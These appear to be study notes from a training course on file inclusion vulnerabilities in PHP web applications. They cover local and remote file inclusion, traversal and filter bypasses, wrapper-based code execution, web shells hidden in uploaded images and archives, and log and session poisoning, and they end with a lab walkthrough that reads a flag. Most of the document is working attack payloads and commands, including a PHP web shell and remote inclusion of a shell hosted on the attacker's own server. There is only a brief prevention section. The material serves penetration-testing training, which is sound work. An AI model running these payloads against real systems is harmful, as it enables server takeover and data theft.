# File Inclusion

1. [Intro to File Inclusions](#intro-to-file-inclusions)
1. [Local File Inclusion (LFI)](#local-file-inclusion-lfi)
1. [Basic Bypasses](#basic-bypasses)
1. [PHP Filters](#php-filters)
1. [PHP Wrappers](#php-wrappers)
1. [Remote File Inclusion](#remote-file-inclusion)
1. [LFI & File Uploads](#lfi--file-uploads)
1. [Log Poisoning](#log-poisoning)
1. [Automated Scanning](#automated-scanning)
1. [File Inclusion Prevention](#file-inclusion-prevention)
1. [Skills Assessment](#skills-assessment)

## Intro to File Inclusions

* If functionalities such as ```HTTP parameters``` are not securely coded, an attacker can manipulate them to display contents of local files on the hosting server, leading to a ```LFI (Local File Inclusion)``` vulnerability.

* ```LFI``` vulnerabilities can lead to source code disclosure, sensitive data exposure and even remote code execution.

* These vulnerabilities can occur in popular web servers & development frameworks such as ```PHP```, ```NodeJS```, ```Java``` and ```.Net```.

* List of functions which may read content and/or execute files:

| **Function**             | **Read Content** | **Execute** | **Remote URL** |
|--------------------------|------------------|-------------|----------------|
| **_PHP_**                |                  |             |                |
| include()/include_once() | Yes              | Yes         | Yes            |
| require()/require_once() | Yes              | Yes         | No             |
| file_get_contents()      | Yes              | No          | Yes            |
| fopen()/file()           | Yes              | No          | No             |
| **_NodeJS_**             |                  |             |                |
| fs.readFile()            | Yes              | No          | No             |
| fs.sendFile()            | Yes              | No          | No             |
| res.render()             | Yes              | Yes         | No             |
| **_Java_**               |                  |             |                |
| include                  | Yes              | No          | No             |
| import                   | Yes              | Yes         | Yes            |
| **_.NET_**               |                  |             |                |
| @Html.Partial()          | Yes              | No          | No             |
| @Html.RemotePartial()    | Yes              | No          | Yes            |
| Response.WriteFile()     | Yes              | No          | No             |
| include                  | Yes              | Yes         | Yes            |

## Local File Inclusion (LFI)

* Basic LFI:

  * For the given example, it is changing the language of the page by modifying the ```language``` parameter in URL - it is pulling a local file:

    ```http://<server_ip>:<port>/index.php?language=es.php```

  * We can change the file being pulled to read a different local file. For example, if the server is running Linux:

    ```http://<server_ip>:<port>/index.php?language=/etc/passwd```

* Path traversal:

  * In previous example, we read the file by specifying absolute path - this works if the input was fetched using this function:

    ```php
    include($_GET['language']);
    ```

  * However, this method would not work if the file is being read from a directory:

    ```php
    include("./languages/" . $_GET['language']);
    ```

  * In this case, we will have to traverse directories by using relative paths - for example, if the full path of the current directory is ```/var/www/html/languages```:

    ```http://<server_ip>:<port>/index.php?language=../../../../etc/passwd```

* Filename prefix:

  * It's possible that input can be appended to a different string to get full filename:

    ```php
    include("lang_" . $_GET['language']);
    ```

  * Here, we cannot use relative path directly - we will have to prefix a ```/``` before our payload (to consider it as a directory):

    ```http://<server_ip>:<port>/index.php?language=/../../../etc/passwd```

* Appended extensions:

  * An extension can also be mapped to the input parameter:

    ```php
    include($_GET['language'] . ".php");
    ```

  * In this case, we cannot read ```/etc/passwd``` using the above methods.

* Second-order attacks:

  * Refers to poisoning a database entry with a malicious LFI payload from user input (such as username)

## Basic Bypasses

* Non-recursive path traversal filters:

  * A basic LFI filter is search-and-replace - simply deletes substrings of ```../``` to avoid path traversals:

    ```php
    $language = str_replace('../', '', $_GET['language']);
    ```

  * This filter is insecure, as it does not recursively remove the ```../``` substring - to bypass this we can use ```....//``` as part of payload:
  
    ```http://<server_ip>:<port>/index.php?language=....//....//....//....//etc/passwd```

  * Other similar bypasses include using payloads like ```..././```, ```....\/```, ```....////```, etc.

* Encoding:

  * Web input filters can prevent certain chars like ```.``` or ```/``` - however, we can bypass some of these by URL encoding our input.

  * For instance, ```../``` upon URL encoding gives ```%2e%2e%2f``` - we can similarly encode the whole payload; a double encoding can also be done if needed.

* Approved paths:

  * Regex can be used to check file included is under a specific path:

    ```php
    if(preg_match('/^\.\/languages\/.+$/', $_GET['language'])) {
    include($_GET['language']);
    } else {
    echo 'Illegal path specified!';
    }
    # only accepts path under ./languages directory
    ```
  
  * To find the approved path, we can examine the requests sent by the forms, and see what path they use for normal functionality - we can also fuzz web directories under the same path.

  * Once found, to bypass it we can use path traversal by starting payload with approved path:

    ```http://<server_ip>:<port>/index.php?language=./languages/../../../../../etc/passwd```

* Appended extension:

  * Web apps can also append an extension like ```.php``` to input string - we may not be able to bypass this in PHP versions after 5.3/5.4.

  * Path truncation:

    * In earlier versions of PHP, defined strings have max length of 4096 chars - if longer string is passed, it is truncated.

    * Also, PHP used to remove trailing slashes & dots like ```/.``` and ```////``` from path names.

    * We can combine these to create long string evaluating to a correct path (can be created with command) - but we need to start the path with a non-existing directory:

      ```http://<server_ip>:<port>/index.php?language=non-existent-dir/../../../etc/passwd/././././.[/. repeated ~2048 times]```

      ```shell
      echo -n "non_existing_directory/../../../etc/passwd/" && for i in {1..2048}; do echo -n "./"; done
      ```

  * Null bytes:

    * PHP versions before 5.5 were vulnerable to ```null byte injection``` - adding null byte ```%00``` to end of string would terminate it:

      ```http://<server_ip>:<port>/index.php?language=../../../../etc/passwd%00```

## PHP Filters

* Input Filters:

  * PHP filters (```php://filter/```) are a type of PHP wrappers (```php:// streams```), in which we can pass input and get it filtered by the filter specified.

  * It has many parameters, but the ones we need are ```resource``` & ```read```; there are filter types like Conversion and Encryption as well.

* Fuzzing for PHP files:

  * Fuzz for available PHP pages using tools like ```ffuf``` or ```gobuster```:

    ```shell
    ffuf -w /opt/useful/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://<server_ip>:<port>/FUZZ.php
    ```

  * We can read the source code of identified files, and scan them for other referenced PHP files as well.

* Standard PHP inclusion:

  * If we try to include any PHP files via LFI, the included file gets executed and rendered as a normal HTML page. For example, ```config.php``` is included (.php extension appended by web app):

    ```http://<server_ip>:<port>/index.php?language=config```
  
  * While this can be useful, viewing the source code is a more useful option - for this we need to use the ```base64``` PHP filter.

* Source code disclosure:

  * Required PHP filter for reading source code of (example) ```config.php``` (if .php is not added automatically by web app, we will need to append that):

    ```php
    php://filter/read=convert.base64-encode/resource=config
    ```

    ```http://<server_ip>:<port>/index.php?language=php://filter/read=convert.base64-encode/resource=config```
  
  * We can then use ```echo <encoded string> | base64 -d``` command to decode & get source code.

## PHP Wrappers

* Data:

  * The ```data``` wrapper can be used to include external data (including PHP code) - however it is only available to use if ```allow_url_include``` is enabled in PHP config.

  * To check this, we can include PHP config file found at ```/etc/php/X.Y/apache2/php.ini``` for Apache or at ```/etc/php/X.Y/fpm/php.ini``` for Nginx, where X.Y is the PHP version:

    ```shell
    curl "http://<server_ip>:<port>/index.php?language=php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini"
    
    echo 'base64-encoded string ...' | base64 -d | grep allow_url_include
    ```

  * Now, for the ```data``` wrapper attack, we can pass base64-encoded string - the filter can decode it and execute PHP code. For example, we can get a basic PHP web shell encoded:

    ```shell
    echo '<?php system($_GET["cmd"]); ?>' | base64
    ```
  
  * Then, we can URL-encode the base64 string & pass it to the ```data``` wrapper - commands can be passed with the ```cmd``` parameter:

    ```shell
    curl -s 'http://<server_ip>:<port>/index.php?language=data://text/plain;base64,<url-encoded base64-encoded web shell>&cmd=id' | grep uid
    # we can view this in browser too
    ```

* Input:

  * The ```input``` wrapper can also be used to include external input (as POST request) & execute PHP code - this also needs the ```allow_url_include``` setting to be enabled.

  * We can send a POST request & add our web shell:

    ```shell
    curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://<SERVER_IP>:<PORT>/index.php?language=php://input&cmd=id" | grep uid
    ```

* Expect:

  * ```expect``` wrapper allows us to directly run commands through URL streams - no need to provide web shell in this case, as it is designed to execute commands.

  * As ```expect``` is an external wrapper, it needs to be manually installed & enabled on the back-end server - we can check if it is there or not (similar to how we check for ```allow_url_include```):

    ```shell
    curl "http://<server_ip>:<port>/index.php?language=php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini"
    
    echo 'base64-encoded string ...' | base64 -d | grep expect
    ```

  * To get RCE with ```expect```:

    ```shell
    curl -s "http://<SERVER_IP>:<PORT>/index.php?language=expect://id"
    ```

## Remote File Inclusion

* When a vulnerable function allows us to include remote files, we can host a malicious script & include it in the vulnerable page to execute functions & gain RCE.

* Almost any RFI vulnerability is also an LFI vulnerability, but it is not the same the other way around.

* Usually, remote URL inclusion is disabled by default - in PHP, ```allow_url_include``` (used in LFI) needs to be enabled for RFI.

* But a more reliable way to verify RFI is to try & include URL - try local URL to ensure it does not get blocked by firewall:

  ```http://<server_ip>:<port>/index.php?language=http://127.0.0.1:80/index.php```

* RCE with RFI:

  * Create malicious script in language of web app:

    ```shell
    echo '<?php system($_GET["cmd"]); ?>' > shell.php
    ```

  * Now we need to host this script & include it through RFI vulnerability - we can do it using HTTP (port 80/443 - can be whitelisted on firewall), FTP or SMB.

  * HTTP:

    ```shell
    sudo python3 -m http.server 80
    # whatever requests we send, we can view it here too
    ```

    ```http://<server_ip>:<port>/index.php?language=http://<our_ip>:80/shell.php&cmd=id```

  * FTP:

    ```shell
    sudo python -m pyftpdlib -p 21
    # starts ftp server, can be used if http:// string is blocked
    
    # by default, PHP tries to authenticate as anonymous user, but creds can be specified too
    curl 'http://<server_ip>:<port>/index.php?language=ftp://user:pass@localhost/shell.php&cmd=id'
    ```

    ```http://<server_ip>:<port>/index.php?language=ftp://<our_ip>/shell.php&cmd=id```

  * SMB:

    ```shell
    # if webapp hosted on Windows server - check server version in HTTP response headers
    # we do not need allow_url_include to be enabled, we can use SMB
    impacket-smbserver -smb2support share $(pwd)
    ```

    ```http://<server_ip>:<port>/index.php?language=\\<our_ip>\share\shell.php&cmd=whoami```

## LFI & File Uploads

* Image upload:

  * Here, the vulnerability exploited is the file inclusion functionality - code within uploaded file can get executed.

  * Craft malicious image containing PHP web shell code - we can use any allowed image extension in file name, but it should include the image magic bytes at beginning of file content:

    ```shell
    echo 'GIF8<?php system($_GET["cmd"]); ?>' > shell.gif
    ```

  * This file is harmless, until combined with an LFI vulnerability - to test this, we can upload the image on the vulnerable page.

  * To include the uploaded file, we need to find the path to uploaded file - inspect source code, fuzz directories and fuzz for uploaded file; and once we have that we can include the file in the LFI function:

    ```http://<server_ip>:<port>/index.php?language=./profile_images/shell.gif&cmd=id```

* Zip upload:

  * The ```zip://``` wrapper used to execute PHP code, if enabled, can be used for LFI - start by creating PHP web shell & zipping it into ```shell.jpg``` (lesser chance of working if zip upload is not allowed):

    ```shell
    echo '<?php system($_GET["cmd"]); ?>' > shell.php && zip shell.jpg shell.php
    ```
  
  * Once ```shell.jpg``` archive is uploaded, we can include it as ```zip://shell.jpg``` and refer to any files within it with ```#shell.php``` (URL-encoded):

    ```http://<server_ip>:<port>/index.php?language=zip://./profile_images/shell.jpg%23shell.php&cmd=id```

* Phar upload:

  * ```phar://``` wrapper (for PHP archives) can be used similarly. First, create ```shell.php```:

    ```php
    <?php
    $phar = new Phar('shell.phar');
    $phar->startBuffering();
    $phar->addFromString('shell.txt', '<?php system($_GET["cmd"]); ?>');
    $phar->setStub('<?php __HALT_COMPILER(); ?>');

    $phar->stopBuffering();
    ```
  
  * Compile it into a ```phar``` file that, when called, would write web shell to ```shell.txt``` sub-file - we can compile & rename the ```phar``` file to ```shell.jpg```:
  
    ```shell
    php --define phar.readonly=0 shell.php && mv shell.phar shell.jpg
    ```

  * Once we upload the ```shell.jpg``` file, we can call it with ```phar://```, specify sub-file with ```/shell.txt``` (URL-encoded):

    ```http://<server_ip>:<port>/index.php?language=phar://./profile_images/shell.jpg%2Fshell.txt&cmd=id```

## Log Poisoning

* Involves writing PHP code in a field we control, that would get logged into a log file - this file can be included via LFI. But we need to have read privileges over logged files and any vulnerable functions with ```Execute``` priv.

* PHP session poisoning:

  * Most PHP webapps use ```PHPSESSID``` cookies, which hold user-related data on backend - stored in session files, on Linux in ```/var/lib/php/sessions/sess_<value of PHPSESSID>``` and on Windows in ```C:\Windows\Temp\sess_<value of PHPSESSID>```

  * If we have the value of ```PHPSESSID``` cookie, we can try including the session file through LFI:

    ```http://<server_ip>:<port>/index.php?language=/var/lib/php/sessions/sess_<PHPSESSID cookie value>```

  * From the contents of the file, we can see that it contains two values - ```page``` & ```preference``` - here, the ```page``` parameter can be controlled by us

  * Attempting to set value of ```page``` to a custom value and see if it changes in session file:

    ```http://<server_ip>:<port>/index.php?language=session_poisoning```
  
  * If we include the session file through LFI again, we can see that the ```page``` parameter is updated now.

  * Now, we can poison by writing PHP code to session file:

    ```http://<SERVER_IP>:<PORT>/index.php?language=%3C%3Fphp%20system%28%24_GET%5B%22cmd%22%5D%29%3B%3F%3E```

  * Finally, we can include session file and execute commands:

    ```http://<server_ip>:<port>/index.php?language=/var/lib/php/sessions/sess_<PHPSESSID cookie value>&cmd=id```

* Server log poisoning:

  * ```Apache``` & ```Nginx``` both maintain log files like ```access.log``` & ```error.log``` - we can attempt to poison the server logs.

  * Once poisoned, we need to include the logs through LFI, for which we need to have read-access over the logs too.

  * The logs can be in different locations, so we can use a [LFI wordlist](https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI) to fuzz.

  * Attempting to include the Apache access log file from ```/var/log/apache2/access.log```:

    ```http://<server_ip>:<port>/index.php?language=/var/log/apache2/access.log```

  * The log contains remote IP address, request page, response code & User-Agent header - User-Agent header is controlled by us through HTTP request headers, so we can poison this.

  * Using ```Burp Suite```, intercept the LFI request sent earlier & modify User-Agent header to "Apache Log Poisoning" (we can poison any other request as well).

  * If the response includes the custom value, that means it works - now we can poison the User-Agent header value with basic PHP web shell; ```curl``` can be used as well for this:

    ```shell
    curl -s "http://<SERVER_IP>:<PORT>/index.php" -A "<?php system($_GET['cmd']); ?>"
    ```

  * Now we can execute commands with LFI:

    ```http://<server_ip>:<port>/index.php?language=/var/log/apache2/access.log&cmd=id```

  * Other logs that could be poisoned with similar techniques include ```/var/log/sshd.log```, ```/var/log/mail```, ```/var/log/vsftpd.log```, etc.

## Automated Scanning

* Fuzzing parameters:

  * We can fuzz the page for common ```GET``` parameters, for example:

    ```shell
    ffuf -w /opt/useful/SecLists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?FUZZ=value' -fs 2287
    ```
  
  * If we find an exposed parameter that is not linked to any forms tested, we can perform all LFI tests.

* LFI wordlists:

  * We can use ```LFI wordlists``` such as [LFI-Jhaddix.txt](https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/LFI/LFI-Jhaddix.txt) to fuzz the parameter:

    ```shell
    ffuf -w /opt/useful/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=FUZZ' -fs 2287
    ```
  
* Fuzzing server files:

  * Server webroot:

    * We may need to know full server webroot path to complete exploitation - we can fuzz for ```index.php``` through common webroot paths [for Linux](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-linux.txt) and [for Windows](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-windows.txt)

    * Depending on LFI, we may need to add a few back directories ```../../../``` and then add ```index.php```:

      ```shell
      ffuf -w /opt/useful/SecLists/Discovery/Web-Content/default-web-root-directory-linux.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ/index.php' -fs 2287
      ```

  * Server logs/configs:

    * We may need the server logs & configuration paths as well, which can be fuzzed using wordlists [for Linux](https://raw.githubusercontent.com/DragonJAR/Security-Wordlist/main/LFI-WordList-Linux) and [for Windows](https://raw.githubusercontent.com/DragonJAR/Security-Wordlist/main/LFI-WordList-Windows); we can then attempt to read the logs based on the results we get from fuzzing:

      ```shell
      ffuf -w ./LFI-WordList-Linux:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ' -fs 2287

      curl http://<SERVER_IP>:<PORT>/index.php?language=../../../../etc/apache2/apache2.conf
      ```

    * If the log file contains a global variable like ```APACHE_LOG_DIR```, we can read another file which stores its values, like ```/etc/apache2/envvars``` - this contains the path for ```access.log``` and ```error.log```.

* LFI tools:

  * For automation, we can use tools like [LFISuite](https://github.com/D35m0nd142/LFISuite), [LFiFreak](https://github.com/OsandaMalith/LFiFreak), and [liffy](https://github.com/mzfr/liffy).

## File Inclusion Prevention

* File inclusion prevention:

  * Avoid passing any user-controlled inputs into any file inclusion functions or APIs.

  * Use a limited whitelist of allowed user inputs, and match each input to the file to be loaded & have a default value for all other inputs.

* Preventing directory traversal:

  * Use programming language's or framework's built-in tool to pull only filename.

  * For custom functions, account for all edge cases, and sanitize user input to recursively remove any attempts of traversing directories.

* Web server configuration:

  * Disable unnecessary configurations.

  * Lock web apps to their web root directory (can use Docker for this as well).

* Web Application Firewall (WAF):

  * Avoid false positives & block non-malicious requests.

## Skills Assessment

* Given the target, the vulnerable parameter 'page' is found.

* Basic LFI does not work:

  ```http://94.237.59.206:56260/index.php?page=/etc/passwd```

* Path traversal gives the error 'invalid input detected':

  ```http://94.237.59.206:56260/index.php?page=../../../../etc/passwd```

* Filename prefix LFI also gives the same error:

  ```http://94.237.59.206:56260/index.php?page=/../../../../etc/passwd```

* Similarly, non-recursive path traversal & encoding techniques don't work as well.

* Fuzzing for PHP files in web directory:

  ```shell
  ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u "http://94.237.59.206:56260/index.php?page=FUZZ.php" -fs 4322
  # filter size can be found out by running this command without -fs flag
  ```

* Fuzzing for other parameters:

  ```shell
  ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u "http://94.237.59.206:56260/index.php?FUZZ=value" -fs 15829
  # gives only 'page' parameter
  ```

* Using LFI wordlists to scan:

  ```shell
  ffuf -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u "http://94.237.59.206:56260/index.php?page=FUZZ" -fs 4322,4521
  # no results
  ```

* We can notice that whatever file we're trying to include via LFI, the '.php' extension is added automatically.

* Using PHP filters, we can try to read the source code of other files:

  ```http://94.237.59.206:56260/index.php?page=php://filter/read=convert.base64-encode/resource=index```

* We can read the source code given above by decoding from base64 - this contains a commented-out path 'ilf_admin/index.php' - it could be a page for Admin access.

* This also contains the logic for the PHP code - we can go through that as well.

* We can now visit the link at ```http://94.237.59.206:56260/ilf_admin/index.php``` - this gives us access to some logs.

* This page uses the 'log' parameter - and reads the files 'chat.log', 'http.log' and 'system.log'.

* We can again try fuzzing using LFI wordlists:

  ```shell
  ffuf -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u "http://94.237.59.206:56260/ilf_admin/index.php?log=FUZZ" -fs 2046
  ```

* This gives us multiple results - we are able to read /etc/passwd now with the help of payloads like ```../../../../../../../../../etc/passwd``` - this shows that it is vulnerable to LFI.

* We can try for log poisoning now, we but do not know if the server is using Apache2 or Nginx - so we need to fuzz here:

  ```shell
  ffuf -w /usr/share/seclists/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt:FUZZ -u "http://94.237.59.206:56260/ilf_admin/index.php?log=FUZZ" -fs 2046
  # this does not work
  # we can use the pattern we found with the payload

  ffuf -w /usr/share/seclists/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt:FUZZ -u "http://94.237.59.206:56260/ilf_admin/index.php?log=../../../../../../../../../FUZZ" -fs 2046
  # this gives us multiple results
  ```

* The above command shows that we can ```/var/log/nginx/access.log``` and ```/var/log/nginx/error.log```.

* For log poisoning technique, using Burp Suite, we can capture a request and send it to Repeater:

  ```http://94.237.59.206:56260/ilf_admin/index.php?log=../../../../../../../../../var/log/nginx/access.log```

* Now, we can modify the 'User-Agent' header value to 'Log Poisoning', and send a request (sometimes, we need to send it again) - this is reflected in the response.

* We can now change the 'User-Agent' value to basic PHP web shell and send the request:

  ```php
  <?php system($_GET['cmd']); ?>
  ```

* Once it is reflected, we get RCE - modify the URL in the GET request to the following:

  ```/ilf_admin/index.php?log=../../../../../../../../../var/log/nginx/access.log&cmd=id```

* This way, we can read the flag in the root directory.
